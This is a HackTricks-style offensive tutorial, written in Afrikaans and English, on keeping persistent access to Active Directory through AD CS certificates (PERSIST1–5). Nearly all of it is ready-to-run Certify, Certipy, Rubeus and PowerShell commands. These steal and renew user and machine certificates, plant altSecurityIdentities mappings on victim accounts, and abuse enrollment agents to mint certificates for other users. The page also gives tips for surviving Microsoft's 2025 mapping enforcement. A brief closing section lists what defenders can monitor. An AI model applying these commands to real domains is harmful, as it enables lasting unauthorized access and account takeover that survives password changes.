# AD CS Rekening-Persistering

{{#include ../../../banners/hacktricks-training.md}}

**Dit is 'n klein opsomming van die rekening-persistering-hoofstukke van die fantastiese navorsing van [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Verstaan Active User Credential Theft met Certificates – PERSIST1

In 'n scenario waar 'n certificate wat domain authentication toelaat deur 'n user aangevra kan word, het 'n attacker die geleentheid om hierdie certificate aan te vra en te steel om persistence op 'n network te behou. By default laat die `User` template in Active Directory sulke requests toe, hoewel dit soms disabled kan wees.

Deur [Certify](https://github.com/GhostPack/Certify) of [Certipy](https://github.com/ly4k/Certipy) te gebruik, kan jy soek vir enabled templates wat client authentication toelaat en dan een aanvra:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
’n Sertifikaat se krag lê in sy vermoë om as die gebruiker waaraan dit behoort te verifieer, ongeag wagwoordveranderings, solank die sertifikaat geldig bly.

Jy kan PEM na PFX omskakel en dit gebruik om ’n TGT te verkry:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Let op: Gekombineer met ander tegnieke (sien THEFT-afdelings), laat sertifikaat-gebaseerde auth volgehoue toegang toe sonder om LSASS aan te raak en selfs vanuit nie-verhewe kontekste.

## Verkry Machine Persistence met Certificates - PERSIST2

As 'n aanvaller verhewe voorregte op 'n host het, kan hulle die gekompromitteerde stelsel se machine account inskryf vir 'n certificate deur die verstek `Machine` template te gebruik. Om as die machine te authenticate maak S4U2Self moontlik vir local services en kan duursame host persistence bied:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Brei Volharding Uit deur Sertifikaatvernuwing - PERSIST3

Deur die geldigheid- en vernuwingstydperke van sertifikaatsjablone te misbruik, kan ’n aanvaller langtermyn-toegang behou. As jy ’n voorheen uitgereikte sertifikaat en sy private sleutel besit, kan jy dit voor verstryking hernu om ’n vars, langlewende geloofsbriewe te verkry sonder om addisionele versoek-artefakte agter te laat wat aan die oorspronklike hoofpersoon gekoppel is.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Operasionele wenk: Hou leeftye op attacker-held PFX-lêers dop en hernu vroegtydig. Hernuwing kan ook veroorsaak dat opgedateerde certificates die moderne SID mapping-uitbreiding insluit, wat hulle bruikbaar hou onder strenger DC mapping-reëls (sien volgende afdeling).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

As jy na ’n teikenrekening se `altSecurityIdentities`-attribuut kan skryf, kan jy eksplisiet ’n attacker-controlled certificate aan daardie rekening map. Dit bly oor password changes heen bestaan en, wanneer strong mapping-formate gebruik word, bly dit funksioneel onder moderne DC enforcement.

Hoëvlak-vloei:

1. Verkry of issue ’n client-auth certificate wat jy beheer (bv. enroll `User` template as jouself).
2. Onttrek ’n strong identifier uit die cert (Issuer+Serial, SKI, of SHA1-PublicKey).
3. Voeg ’n eksplisiete mapping by op die victim principal se `altSecurityIdentities` deur daardie identifier te gebruik.
4. Authenticate met jou certificate; die DC map dit na die victim via die eksplisiete mapping.

Voorbeeld (PowerShell) wat ’n strong Issuer+Serial mapping gebruik:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Dan verifieer met jou PFX. Certipy sal ’n TGT direk verkry:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Bou sterk `altSecurityIdentities`-toewysings

In die praktyk is **Issuer+Serial** en **SKI**-toewysings die maklikste sterk formate om vanuit ’n aanvaller-beheerde sertifikaat te bou. Dit maak saak ná **11 Februarie 2025**, wanneer DCs standaard na **Full Enforcement** oorskakel en swak toewysings ophou betroubaar wees.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notas
- Gebruik net sterk toewysingstipes: `X509IssuerSerialNumber`, `X509SKI`, of `X509SHA1PublicKey`. Swak formate (Subject/Issuer, Subject-only, RFC822 email) is verouderd en kan deur DC policy geblokkeer word.
- Die toewysing werk op beide **user** en **computer** objects, so write access to a computer account's `altSecurityIdentities` is genoeg om as daardie machine te persistence.
- Die cert chain moet bou na 'n root wat deur die DC vertrou word. Enterprise CAs in NTAuth word tipies vertrou; sommige omgewings vertrou ook public CAs.
- Schannel authentication bly nuttig vir persistence selfs wanneer PKINIT faal omdat die DC nie die Smart Card Logon EKU het nie of `KDC_ERR_PADATA_TYPE_NOSUPP` teruggee.

#### 2025+ `Issuer/SID` explicit mappings

Op **Windows Server 2022+** domain controllers wat met die **September 9, 2025** security update gepatch is, het Microsoft nog 'n sterk explicit mapping format bygevoeg wat aantreklik is vir persistence omdat dit certificate reissuance van dieselfde CA oorleef:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Operasioneel verskil dit van die ouer sterk formate:
- `Issuer+Serial` pin **een presiese sertifikaat**.
- `SKI` / `SHA1-PUKEY` pin **een keypair**.
- `Issuer/SID` pin die **uitreikende CA + teiken SID**, so hernuwe of heruitgereikte sertifikate van dieselfde CA bly werk sonder om `altSecurityIdentities` te herskryf.

Vereistes en waarskuwings
- Die sertifikaat wat vir logon aangebied word, moet werklik die teikenrekening se SID in die SID security extension bevat.
- Hierdie formaat is nie nuttig vir `ESC9` / `ESC16`-styl sertifikate wat die SID extension weglaat nie; in daardie gevalle val terug op `Issuer+Serial`, `SKI`, of `SHA1-PUKEY`.

Vir meer oor weak explicit mappings en aanvalspaaie, sien:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

As jy ’n geldige Certificate Request Agent/Enrollment Agent-sertifikaat verkry, kan jy nuwe logon-capable sertifikate namens gebruikers na willekeur mint en die agent PFX offline hou as ’n persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Herroeping van die agent-sertifikaat of template-magtigings is nodig om hierdie persistence te verwyder.

Operasionele notas
- Moderne `Certipy` weergawes ondersteun beide `-on-behalf-of` en `-renew`, so ’n aanvaller wat ’n Enrollment Agent PFX hou, kan leaf certificates mint en later renew sonder om weer die oorspronklike teikenrekening te raak.
- As PKINIT-gebaseerde TGT retrieval nie moontlik is nie, is die gevolglike on-behalf-of sertifikaat steeds bruikbaar vir Schannel authentication met `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Using Persisted Certificates When PKINIT Fails

As die DC nie ’n Smart Card Logon-capable sertifikaat het nie, kan certificate logon via PKINIT faal met `KDC_ERR_PADATA_TYPE_NOSUPP`. Dit beëindig nie die persistence primitive nie: dieselfde PFX is dikwels steeds bruikbaar vir Schannel-geauthentiseerde LDAP access.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Dit is veral nuttig ná PERSIST4/PERSIST5 omdat jy vanaf Linux/macOS kan voortgaan om te werk en ander directory persistence-aksies kan ketting, soos om [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) te laat val of skryfbare delegation attributes te redigeer.

## 2025 Strong Certificate Mapping Enforcement: Impak op Persistence

Microsoft KB5014754 het Strong Certificate Mapping Enforcement op domain controllers bekendgestel. Sedert **11 Februarie 2025**, gebruik DCs by verstek **Full Enforcement** vir swak/ambiguous mappings, en vanaf die **9 September 2025** security update ondersteun gepatchte DCs nie meer die ou Compatibility-mode fallback nie. Praktiese implikasies:

- Pre-2022 certificates wat nie die SID mapping extension het nie, kan faal in implicit mapping wanneer DCs in Full Enforcement is. Attackers kan toegang behou deur óf certificates via AD CS te vernuwe (om die SID extension te verkry) óf deur ’n sterk explicit mapping in `altSecurityIdentities` te plaas (PERSIST4).
- Explicit mappings wat strong formats gebruik (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, en op moderne DCs `Issuer/SID`) werk steeds. Weak formats (Issuer/Subject, Subject-only, RFC822) kan geblokkeer word en moet vir persistence vermy word.
- As weak mappings steeds lyk of hulle werk, neem aan jy het ’n ongepatchte of anders gekonfigureerde DC getref eerder as ’n betroubare langtermyn persistence pad.
- `ESC9` / `ESC16`-styl issuance paths wat die SID extension onderdruk maak `Issuer/SID` onbruikbaar, so fallback strong mappings of vernuwing via ’n normale template word die praktiese persistence-opsie.

Administrators behoort te monitor en te alert op:
- Veranderinge aan `altSecurityIdentities` en issuance/renewals van Enrollment Agent en User certificates.
- CA issuance logs vir on-behalf-of requests en ongewone renewal-patrone.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
